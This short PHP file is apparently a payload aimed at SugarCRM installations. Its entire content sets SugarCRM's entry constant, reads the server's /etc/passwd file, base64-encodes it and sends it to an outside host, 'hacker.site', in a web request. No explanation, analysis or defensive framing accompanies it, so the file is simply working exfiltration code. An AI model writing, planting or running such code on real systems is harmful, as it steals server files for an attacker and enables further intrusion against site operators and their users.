<?php
    
defined('sugarEntry') or define('sugarEntry', true);
$pass =  base64_encode(file_get_contents('/etc/passwd'));
file_get_contents('http://hacker.site/?pass=' . $pass );
